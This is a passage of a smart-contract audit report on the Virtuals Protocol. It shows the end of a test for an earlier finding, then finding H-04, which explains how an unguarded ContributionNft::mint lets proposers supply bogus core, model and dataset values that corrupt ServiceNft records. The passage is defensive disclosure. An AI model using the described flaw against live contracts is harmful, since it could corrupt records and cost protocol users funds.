class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    );\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const { trader, poorMan, founder, randomAddr, deployer } = await getAccounts();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Update the impact\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await service.connect(trader).updateImpact(1n, 1n);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Old - DATASET_SHARES=7000 # 70%\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    expect(await service.datasetImpactWeight()).to.be.eq(7000n);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Change the datasetImpactWeight\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Setting to 8000\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await service.connect(deployer).setDatasetImpactWeight(8000n);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    expect(await service.datasetImpactWeight()).to.be.eq(8000n);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Again updating impact should work\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await service.connect(trader).updateImpact(1n, 1n);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  });\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e});\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003c/details\u003e\n\u003cp\u003e\u003cstrong\u003eVirtuals marked as informative\u003c/strong\u003e\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 id=\"h-04-public-contributionnftmint-leads-to-cascading-issues--loss-of-funds\" style=\"position:relative;\"\u003e\u003ca href=\"#h-04-public-contributionnftmint-leads-to-cascading-issues--loss-of-funds\" aria-label=\"h 04 public contributionnftmint leads to cascading issues  loss of funds permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/F-54\"\u003e[H-04] Public \u003ccode\u003eContributionNft::mint\u003c/code\u003e leads to cascading issues / loss of funds\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003e\u003cem\u003eSubmitted by \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-560\"\u003eYouCrossTheLineAlfie\u003c/a\u003e, also found by \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-797\"\u003eaxelot\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-249\"\u003eDarkeEEandMe\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-331\"\u003eLegend\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-49\"\u003embuba666\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-175\"\u003eRaOne\u003c/a\u003e, and \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-107\"\u003esergei2340\u003c/a\u003e\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003eThe contributors are supposed to submit their proposals via frontend and it is assumed from the \u003ca href=\"https://whitepaper.virtuals.io/about-virtuals-1/the-protocol/co-contribution-and-provenance/modular-consensus-framework\"\u003edocs\u003c/a\u003e, that the frontend calls the \u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/contribution/ContributionNft.sol#L65\"\u003e\u003ccode\u003eContributionNft::mint\u003c/code\u003e\u003c/a\u003e function to mint as per the proposed proposal.\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"14\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eContribution Process: Contributors submit their proposals through our frontend, utilizing the modular consensus framework. Each proposal generates a contribution NFT regardless of acceptance, authenticating the submission\u0026#39;s origin.\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eHowever, the \u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/contribution/ContributionNft.sol#L65\"\u003e\u003ccode\u003eContributionNft::mint\u003c/code\u003e\u003c/a\u003e is un-gaurded, allowing proposers to mint their own NFTs.\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"15\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003emint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint8\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecoreId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003estring\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003enewTokenURI\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eparentId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eisModel_\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edatasetId\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    ) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eIGovernor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epersonaDAO\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetAgentDAO\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emsg\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e == \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epersonaDAO\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eproposalProposer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e),\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Only proposal proposer can mint Contribution NFT\u0026quot;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        );\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eparentId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e != \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Cannot be parent of itself\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eAn issue arises here when these proposers are able to pass in incorrect/bogus values of incorrect \u003ccode\u003ecoreId\u003c/code\u003e, \u003ccode\u003enewTokenURI\u003c/code\u003e, \u003ccode\u003eparentId\u003c/code\u003e, \u003ccode\u003eisModel_\u003c/code\u003e and \u003ccode\u003edatasetId\u003c/code\u003e.\u003c/p\u003e\n\u003ch3 id=\"impact-1\" style=\"position:relative;\"\u003e\u003ca href=\"#impact-1\" aria-label=\"impact 1 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eImpact\u003c/h3\u003e\n\u003col\u003e\n\u003cli\u003eIncorrect cores and model values inside the \u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/contribution/ServiceNft.sol#L58C14-L58C18\"\u003e\u003ccode\u003eServiceNft::mint\u003c/code\u003e\u003c/a\u003e function, leading to incorrect \u003ccode\u003eserviceNFT\u003c/code\u003e mint:\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"16\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003emint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebytes32\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edescHash\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// . . . Rest of the code . . .\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epersonaDAO\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ehashProposal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etargets\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evalues\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecalldatas\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edescHash\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_mint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003einfo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etba\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_cores\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIContributionNft\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003econtributionNft\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetCore\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);     \u0026lt;\u0026lt;@ -- \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Incorrect core set\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Calculate maturity\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_maturities\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIAgentDAO\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003einfo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003edao\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetMaturity\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eisModel\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIContributionNft\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003econtributionNft\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eisModel\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);               \u0026lt;\u0026lt;@ -- \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Incorrect model\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eisModel\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eemit\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eCoreServiceUpdated\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_cores\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e], \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eupdateImpact\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_coreServices\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e][\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_cores\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e]] = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        } \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eelse\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_coreDatasets\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e][\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_cores\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e]].\u003c/span\u003e\u003cspan class=\"mtk11\"\u003epush\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// . . . Rest of the code . . .\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003col start=\"2\"\u003e\n\u003cli\u003eIncorrect \u003ccode\u003edatasetId\u003c/code\u003e would overwrite someone else’s values as well as incorrect \u003ccode\u003e_impacts\u003c/code\u003e calculated for both \u003ccode\u003eproposalId\u003c/code\u003e and \u003ccode\u003edatasetId\u003c/code\u003e can be seen inside the \u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/contribution/ServiceNft.sol#L90\"\u003e\u003ccode\u003eServiceNft::updateImpact\u003c/code\u003e\u003c/a\u003e:\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"17\"\u003e\u003ccode 